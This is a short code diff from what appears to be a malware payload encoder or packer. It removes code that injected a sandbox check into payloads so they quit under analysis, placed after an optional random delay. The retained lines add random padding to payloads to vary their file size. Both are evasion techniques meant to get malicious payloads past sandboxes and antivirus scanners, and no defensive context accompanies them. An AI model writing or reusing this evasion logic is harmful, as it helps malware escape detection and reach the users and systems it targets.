@@ -98,28 +98,6 @@ def Encode(data, output):
     
     import re
     
-    # Sandbox detection code (will run after delay if present)
-    sandbox_detection = """from sandboxed import is_sandboxed
-import sys
-certainty = is_sandboxed(logging=False)
-if int(certainty)>0.5:
-    sys.exit()
-"""
-    
-    # Check if data has a delay at the beginning and extract it
-    delay_match = re.match(r'^(import time\nimport random\ntime\.sleep\(random\.randint\([^)]+\)\)\n\n)', data)
-    
-    if delay_match:
-        # Extract the delay code
-        delay_code = delay_match.group(1)
-        # Remove delay from original position
-        rest_of_payload = data[len(delay_code):]
-        # Put delay first, then sandbox detection, then rest of payload
-        data = delay_code + sandbox_detection + "\n" + rest_of_payload
-    else:
-        # No delay, just add sandbox detection at the beginning
-        data = sandbox_detection + "\n" + data
-    
     # Add random padding to randomize file size
     print("[*] Adding random padding to payload...")
     data = add_random_padding(data)
